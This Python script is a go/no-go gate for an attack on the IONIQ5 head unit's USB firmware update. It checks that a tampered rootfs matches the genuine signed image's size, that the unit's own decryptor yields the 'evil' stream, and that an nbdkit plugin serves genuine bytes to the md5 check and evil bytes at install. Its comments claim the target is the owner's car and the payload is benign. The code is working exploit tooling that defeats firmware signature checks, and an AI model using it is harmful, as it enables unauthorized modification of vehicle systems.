#!/usr/bin/env python3
# PREFLIGHT — bench/Pi go/no-go gate for the IONIQ5 USB-update TOCTOU deployment.
# Built from the VM Path-1 ground truth so a mis-built artifact is caught BEFORE the Pi is
# ever plugged into the head unit. Owner's own decommissioned car; benign payload.
#
# Checks (each: PASS / FAIL / SKIP):
#   A  baseline identity   md5(genuine mango) == signed value, size exact  -> the baseline the HU
#                          md5sum-checks really is the genuine, RSA-signed image.
#   B  envelope shape      size(evil) == size(genuine); evil content differs -> same extent, swappable.
#   C  real install decrypt (x86-64 only)  run the REAL DecryptToPIPE on evil (named
#                          mango-rootfs.tar.gz, so the TE2 IV matches) and assert the decrypted
#                          stream == the proven evil hash and != the genuine hash. Because that
#                          hash is a full-stream digest of the exact stream Path-1 proved unpacks
#                          to the patched rootfs (wideopen.service), C passing certifies the payload.
#   D  gadget swap dry-run (any arch)  drive the REAL nbdkit plugin against the REAL usb.img +
#                          regions.json: read the rootfs region twice; pass#1 must equal genuine
#                          bytes, pass#2 must equal evil bytes. Validates the regions.json extent
#                          and that the switch fires on the install pass. No root/mount needed.
#
# A FAIL on any enabled check means DO NOT plug into the car. SKIPs are warned, not fatal.
#
#   python3 preflight.py [--binroot DIR] [--genuine P] [--evil P] [--usb P] [--regions P] [--deep]
import os, sys, argparse, hashlib, subprocess, tempfile, shutil, platform, importlib.util

HERE  = os.path.dirname(os.path.abspath(__file__))
REPO  = os.path.abspath(os.path.join(HERE, "..", "..", ".."))
# --- ground truth from the signed package and the VM Path-1 run (re-confirmed 2026-11-02) ---
GEN_MD5  = "7f510002ed35972bed8edd0479c91679"                                     # md5(genuine mango) = the RSA-signed value
GEN_SIZE = 879126179                                                             # genuine envelope size (bytes)
DTP_GEN  = "1bea1702012e1a94515e37c4c992d36b49ccdd3129e6a3347cbf915f5c723910"    # DecryptToPIPE(genuine) stream sha256
DTP_EVIL = "f83bddd91635ff475218a878141e7fe7c6f1e13e96f44eec1be6e59d7bec926d"    # DecryptToPIPE(evil@mango) stream sha256

G, Y, R, X = "\033[32m", "\033[33m", "\033[31m", "\033[0m"
_fail = 0; _skip = 0
def PASS(m): print(f"  [{G}PASS{X}] {m}")
def FAIL(m):
    global _fail; _fail += 1; print(f"  [{R}FAIL{X}] {m}")
def SKIP(m):
    global _skip; _skip += 1; print(f"  [{Y}SKIP{X}] {m}")

def md5_file(p):
    h = hashlib.md5()
    with open(p, "rb") as f:
        for c in iter(lambda: f.read(1 << 20), b""): h.update(c)
    return h.hexdigest()

def find_binroot(hint):
    """Locate an extracted HU rootfs containing the real DecryptToPIPE + its loader."""
    cands = []
    if hint: cands.append(hint)
    cands.append(os.path.join(HERE, "build", "binroot"))
    # the scratchpad left by the VM Path-1 extraction, if still present
    sp = os.environ.get("CLAUDE_SCRATCHPAD", "")
    if sp: cands.append(os.path.join(sp, "t1", "rootfs"))
    for d in cands:
        dtp = os.path.join(d, "app/share/AppUpgrade/DecryptToPIPE")
        ld  = os.path.join(d, "lib/ld-2.25.so")
        if os.path.exists(dtp) and os.path.exists(ld):
            return d
    return None

def dtp_stream_sha(binroot, envelope_path):
    """Run the real x86-64 DecryptToPIPE exactly as the installer does: argv -d <keyfile> <input> 0.
       NOTE: the keyarg (%2) must be an EXISTING readable file — a missing path yields a different
       stream. The embedded AES content key does the decryption; the keyfile's presence gates it."""
    ld   = os.path.join(binroot, "lib/ld-2.25.so")
    libs = f"{binroot}/lib:{binroot}/usr/lib"
    dtp  = os.path.join(binroot, "app/share/AppUpgrade/DecryptToPIPE")
    keyf = os.path.join(tempfile.gettempdir(), "preflight.keyarg")
    open(keyf, "wb").write(b"\x00" * 32)                     # any existing file satisfies %2
    p = subprocess.Popen(f'"{ld}" --library-path "{libs}" "{dtp}" -d "{keyf}" "{envelope_path}" 0',
                         shell=True, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
    h = hashlib.sha256(); n = 0
    for c in iter(lambda: p.stdout.read(1 << 20), b""): h.update(c); n += len(c)
    p.wait()
    return h.hexdigest(), n

def load_plugin():
    spec = importlib.util.spec_from_file_location("nbdkit_toctou", os.path.join(HERE, "nbdkit_toctou.py"))
    m = importlib.util.module_from_spec(spec); spec.loader.exec_module(m); return m

def main():
    ap = argparse.ArgumentParser()
    _pkg = os.environ.get("IONIQ_PKG", os.path.expanduser("~/ioniq/IONIQ5_EU"))  # firmware pkg (symlink ok)
    ap.add_argument("--genuine", default=os.path.join(_pkg, "HU/images/mango-rootfs.tar.gz"))
    ap.add_argument("--evil",    default=os.path.join(HERE, "build", "evil_rootfs.te2"))
    ap.add_argument("--usb",     default=os.path.join(HERE, "build", "usb.img"))
    ap.add_argument("--regions", default=os.path.join(HERE, "build", "regions.json"))
    ap.add_argument("--binroot", default=None, help="extracted HU rootfs with DecryptToPIPE + ld-2.25.so")
    ap.add_argument("--deep", action="store_true", help="also tar-list the decrypted evil to see wideopen.service")
    a = ap.parse_args()

    print("=" * 72)
    print("PREFLIGHT — IONIQ5 USB-update TOCTOU deployment gate (benign; owner's own car)")
    print("=" * 72)

    # ---- A: baseline identity -------------------------------------------------------------
    print("\nA. baseline identity (the HU md5sum-checks THIS file)")
    if not os.path.exists(a.genuine):
        FAIL(f"genuine not found: {a.genuine}")
    else:
        sz = os.path.getsize(a.genuine); m5 = md5_file(a.genuine)
        (PASS if sz == GEN_SIZE else FAIL)(f"size {sz} (expect {GEN_SIZE})")
        (PASS if m5 == GEN_MD5 else FAIL)(f"md5 {m5} (expect signed {GEN_MD5})")

    # ---- B: envelope shape ----------------------------------------------------------------
    print("\nB. evil envelope shape (must occupy the identical extent, differ in content)")
    if not os.path.exists(a.evil):
        FAIL(f"evil envelope not found: {a.evil}  (run 01_make_evil_rootfs.sh)")
    elif not os.path.exists(a.genuine):
        SKIP("no genuine to compare against")
    else:
        es = os.path.getsize(a.evil); gs = os.path.getsize(a.genuine)
        (PASS if es == gs else FAIL)(f"evil size {es} == genuine size {gs}")
        em = md5_file(a.evil)
        (PASS if em != GEN_MD5 else FAIL)(f"evil md5 {em} differs from genuine {GEN_MD5}")

    # ---- C: real install decrypt (x86-64 binary) ------------------------------------------
    print("\nC. real DecryptToPIPE install decrypt (x86-64 HU binary; run on the bench)")
    binroot = find_binroot(a.binroot)
    if platform.machine() not in ("x86_64", "amd64"):
        SKIP(f"host is {platform.machine()}; DecryptToPIPE is x86-64 — run check C on the x86-64 bench, not the Pi")
    elif binroot is None:
        SKIP("no binroot with DecryptToPIPE+ld-2.25.so (pass --binroot, or let 04_preflight.sh extract it)")
    elif not os.path.exists(a.evil):
        SKIP("no evil envelope to decrypt")
    else:
        work = tempfile.mkdtemp()
        try:
            tgt = os.path.join(work, "mango-rootfs.tar.gz")      # basename fixes the TE2 IV
            shutil.copyfile(a.evil, tgt)
            sha, n = dtp_stream_sha(binroot, tgt)
            print(f"       binroot={binroot}")
            print(f"       decrypted stream sha256={sha} ({n} bytes)")
            (PASS if sha == DTP_EVIL else FAIL)(f"== proven evil install hash {DTP_EVIL[:16]}…")
            (PASS if sha != DTP_GEN  else FAIL)(f"!= genuine install hash  {DTP_GEN[:16]}…")
            if sha == DTP_EVIL:
                print("       (this is the exact stream Path-1 proved unpacks to the patched rootfs w/ wideopen.service)")
            if a.deep and sha == DTP_EVIL:
                refe = os.path.join(work, "plain.tar.gz")
                subprocess.run(f'python3 "{HERE}/gen5w_decrypt.py" decrypt "{tgt}" "{refe}" --force',
                               shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                gt = subprocess.run(f'zcat "{refe}" 2>/dev/null | tar -t 2>/dev/null | grep -c wideopen.service',
                                    shell=True, capture_output=True, text=True).stdout.strip()
                (PASS if gt not in ("", "0") else FAIL)(f"--deep: wideopen.service present in decrypted tree ({gt})")
        finally:
            shutil.rmtree(work, ignore_errors=True)

    # ---- D: gadget swap dry-run (real plugin, real image; any arch) ------------------------
    print("\nD. gadget swap dry-run (real nbdkit plugin vs real usb.img + regions.json)")
    if not (os.path.exists(a.usb) and os.path.exists(a.regions)):
        SKIP(f"need usb.img + regions.json (run 02_build_usb_image.sh first): {a.usb}, {a.regions}")
    elif not os.path.exists(a.genuine) or not os.path.exists(a.evil):
        SKIP("need genuine + evil to compare the served bytes against")
    else:
        pl = load_plugin()
        pl._cfg.clear(); pl._regions.clear(); pl._base_fd = None; pl._size = 0
        pl.config("baseline", a.usb); pl.config("regions", a.regions)
        pl.config("log", os.path.join(tempfile.gettempdir(), "preflight_toctou.log"))
        pl.config_complete(); h = pl.open(False)
        # pick the benign_then_evil rootfs region
        reg = next((r for r in pl._regions if r["mode"] == "benign_then_evil"), None)
        if reg is None:
            FAIL("no benign_then_evil region in regions.json")
        else:
            off, ln, swp = reg["off"], reg["len"], reg["switch_after_pass"]
            def read_pass():
                hh = hashlib.sha256(); o = off; end = off + ln
                while o < end:
                    c = min(1 << 20, end - o); hh.update(pl.pread(h, c, o)); o += c
                return hh.hexdigest()
            # reference digests of the raw genuine/evil files (what the region should serve)
            def sha_file(p):
                hh = hashlib.sha256()
                with open(p, "rb") as f:
                    for c in iter(lambda: f.read(1 << 20), b""): hh.update(c)
                return hh.hexdigest()
            ref_gen = sha_file(a.genuine); ref_evl = sha_file(a.evil)
            passes = [read_pass() for _ in range(max(swp, 2))]
            pl.close(h)
            print(f"       region off={off} len={ln} switch_after_pass={swp}")
            # passes before the switch must be genuine; the switch pass onward must be evil
            pre_ok  = all(p == ref_gen for p in passes[:swp - 1])
            post_ok = passes[swp - 1] == ref_evl
            (PASS if pre_ok  else FAIL)(f"pass(es) 1..{swp-1} serve GENUINE bytes (the md5sum check sees genuine)")
            (PASS if post_ok else FAIL)(f"pass #{swp} serves EVIL bytes (the DecryptToPIPE install gets evil)")
            if not (pre_ok and post_ok):
                print("       -> likely a wrong extent in regions.json, or switch_after_pass mismatch.")

    # ---- verdict --------------------------------------------------------------------------
    print("\n" + "-" * 72)
    if _fail:
        print(f"PREFLIGHT: {R}FAIL{X} ({_fail} failed, {_skip} skipped) — DO NOT plug into the car.")
        sys.exit(1)
    print(f"PREFLIGHT: {G}OK{X} ({_skip} skipped) — artifacts are consistent with the proven attack.")
    if _skip:
        print("           (resolve the SKIPs for full coverage: binroot for C, built image for D.)")
    sys.exit(0)

if __name__ == "__main__":
    main()
